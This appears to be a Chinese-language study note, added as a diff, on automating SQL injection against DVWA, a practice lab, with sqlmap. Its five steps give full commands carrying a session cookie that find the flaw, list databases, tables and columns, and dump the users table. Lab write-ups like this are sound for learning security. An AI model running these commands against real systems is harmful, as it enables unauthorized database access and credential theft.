@@ -1,0 +1,30 @@
+**DVWA之SQL注入漏洞
+##SQLmap，把复杂的利用过程自动化
+----SQLmap官网：https://sqlmap.org/
+---下载方法：
+--可下载源代码，直接使用python运行sqlmap.py
+-Python2.x环境下载地址：https://www.python.org/downloads/release/python-2715/
+--安装kail操作系统,kail自带sqlmap，可以直接输入sqlmap执行
+
+--打开方式
+--cmd打开sqlmap.py的位置，再输入python sqlmap.py
+
+----SQLmap自动化SQL注入利用注入过程一般如下
+---第一步：检测漏洞
+--先在DVWA网站中SQL Injection的User ID中输入1，并复制网址
+--python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dvon1lac8fa65nmfm23358t4a6; security=low"
+--其中：-u:url地址，即需要检测的网址，--cookie:因为DVWA需要登录，可在浏览器控制台里查看请求消息头中获取cookie
+---第二步：获取数据库名
+--python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dvon1lac8fa65nmfm23358t4a6; security=low" --dbs
+--其中：-dbs:database server 获取所有数据库名
+---第三步：获取指定数据库表
+--python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dvon1lac8fa65nmfm23358t4a6; security=low" -D dvwa --tables
+--其中，-D:Database 指定想要获取的数据库名为dvwa , --tables:列出数据库表
+---第四步：获取指定数据库列/表项
+--python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dvon1lac8fa65nmfm23358t4a6; security=low" -D dvwa -T users --columns
+--其中，-D:Database 指定想要获取的数据库名为dvwa ，-T：Table 指定想要获取的表名为users ， --columns：列出表项/列
+---第五步：获取数据
+--python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dvon1lac8fa65nmfm23358t4a6; security=low" -D dvwa -T users --dump
+--其中，--dump：读取数据
+
+
